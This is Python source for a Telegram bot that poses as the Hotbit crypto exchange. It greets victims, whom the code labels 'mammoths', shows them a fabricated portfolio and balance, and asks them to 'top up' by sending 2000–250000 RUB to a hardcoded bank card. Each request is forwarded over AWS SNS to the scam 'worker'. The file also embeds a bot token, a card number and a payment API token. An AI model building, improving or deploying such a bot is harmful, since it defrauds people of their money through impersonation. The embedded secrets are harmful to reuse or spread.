import datetime
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.dispatcher import FSMContext
from aiogram.types import ParseMode, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, InputFile
from aiogram.dispatcher.filters.state import State, StatesGroup
from db import Worker, session, Mammoth
from img import generate_profile_stats_for_worker
from monobank import waiting_for_mamont_async
from  aws import sns, aws_region, aws_access_key_id, aws_secret_access_key


admin_chat_id  = '881704893'
API_TOKEN = '6697933833:AAFVFw0NlunxTO741GRBf3krcjDbIL_mXp8'



logging.basicConfig(level=logging.INFO)

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)
dp.middleware.setup(LoggingMiddleware())


def top_up_balance():
    return InlineKeyboardMarkup().add(InlineKeyboardButton('Пополнить', callback_data='top_up_balance'))

def top_up_balance_by_card():
    return InlineKeyboardMarkup().add(InlineKeyboardButton('Банковская карта', callback_data='top_up_balance_by_card'))




markup = ReplyKeyboardMarkup(resize_keyboard=True)
portfolio = KeyboardButton('Портфель 📂')
open_ecn = KeyboardButton('Открыть ECN 💹')
info = KeyboardButton('Инфо ℹ')
support = KeyboardButton('Тех. Поддержка 🌐')

markup.add(portfolio)
markup.add(open_ecn)
markup.add(info,support)

class PortfolioStates(StatesGroup):
    ShowPortfolio = State()


class TopUpBalance(StatesGroup):
    WaitingForSum = State

@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    user_param = message.get_args()
    print('param')
    print(user_param)
    await message.answer(user_param)
    first_name = message['from']['first_name']
    template = f"""
*Приветствую, {first_name}*

Это телеграм бот криптоплатформы Hotbit  для торговли на фьючерсах. А также быстрый и бесплатный криптовалютный кошелек.
    
    
    
    """


    if not session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id).first():
        await message.reply(template, parse_mode=ParseMode.MARKDOWN, reply_markup=markup)
        new_mammonth = Mammoth(telegram_id = message.from_user.id)
        session.add(new_mammonth)
        session.commit()
    else:
        await showportfolio(message)

@dp.message_handler(lambda message: message.text == 'Портфель 📂')
async def portfolio_handler(message: types.Message):
    await message.answer("⚡")
    await showportfolio(message)

@dp.message_handler(lambda message: message.text == 'Открыть ECN 💹')
async def open_ecn_handler(message: types.Message):
    await message.answer("Вы выбрали Открыть ECN 💹")

@dp.message_handler(lambda message: message.text == 'Инфо ℹ')
async def info_handler(message: types.Message):
    await message.answer("Вы выбрали Инфо ℹ")

@dp.message_handler(lambda message: message.text == 'Тех. Поддержка 🌐')
async def support_handler(message: types.Message):
    await message.answer("Вы выбрали Тех. Поддержка 🌐")



@dp.message_handler(lambda message: not (2000 <= int(message.text) <= 250000), state=TopUpBalance.WaitingForSum )
async def waiting_for_sum_out_of_range(message: types.Message):
    """
    Обработчик для суммы, выходящей за пределы диапазона
    """
    await message.reply("Сумма должна быть от 2000 до 250000 рублей. Пожалуйста, введите корректную сумму.")


@dp.message_handler(lambda message: 2000 <= int(message.text) <= 250000, state=TopUpBalance.WaitingForSum )
async def waiting_for_sum_handler(message: types.Message, state:FSMContext):
    await  message.answer('Бот ожидает перевода  на карту `4441114419894785` в течении 15 минут', parse_mode=ParseMode.MARKDOWN)

    message_attributes = {
        'WorkerId': {
            'DataType': 'Number',
            'StringValue': f'{admin_chat_id}'
        },
        'MammonthId': {
            'DataType': 'Number',
            'StringValue': f'{message.from_user.id}'
        },
        'Sum': {
            'DataType': 'Number',
            'StringValue': f'{message.text}'
        },
        'FirstName': {
            'DataType': 'String',
            'StringValue': f'{message.from_user.first_name}'
        },
    }
    sns.publish(TopicArn='arn:aws:sns:eu-north-1:441199499768:NewApplications',

                Message=f'''NewApplicationToTopUp''', MessageAttributes=message_attributes

                )
    await waiting_for_mamont_async(datetime.datetime.now(), 0, 'u3dL8d8BJIbUvxNFME1wIOOGdb6BDWUlnX3_Zc9976dc')


async def showportfolio(message: types.Message):

    user = session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id).first()


    template =    f"""
📂 Личный кабинет

➖➖➖➖➖➖➖➖➖➖
*⚠️ Не верифицирован*
➖➖➖➖➖➖➖➖➖➖
💰 Баланс: {user.balance} RUB
📤 На выводе: {user.on_output} RUB
💼 Криптопортфель:
        *{user.cryptoportfolio['btc']} BTC
        {user.cryptoportfolio['eth']} ETH
        {user.cryptoportfolio['ltc']} LTC*
Ваш  ID - `{user.telegram_id}`
➖➖➖➖➖➖➖➖➖➖
Успешных сделок - {user.succesful_deals}
Всего сделок - {user.deals}
➖➖➖➖➖➖➖➖➖➖

Дата и время: {user.created_at.strftime("%d.%m.%Y %H:%M:%S")}  
    
    """
    with open('hotbit.jpg', 'rb') as image:
        await bot.send_photo(message.from_user.id, InputFile(image), caption=template, reply_markup=top_up_balance(), parse_mode=ParseMode.MARKDOWN)


@dp.callback_query_handler(lambda callback_query: callback_query.data == 'top_up_balance')
async def handle_top_up_balance(query: types.CallbackQuery):
    await query.message.answer('Выберите удобный для вас метод пополнения.', reply_markup=top_up_balance_by_card())
    await query.message.delete()

@dp.callback_query_handler(lambda callback_query: callback_query.data == 'top_up_balance_by_card')
async def handle_top_up_balance_by_card(query: types.CallbackQuery):
    await TopUpBalance.WaitingForSum.set()
    await query.message.answer('💰 Введите сумму пополнения от 2500 RUB до 250000 RUB')





if __name__ == '__main__':
    from aiogram import executor

    storage = MemoryStorage()
    # Подключаем MemoryStorage к боту
    dp.storage = storage
    executor.start_polling(dp, skip_updates=True)

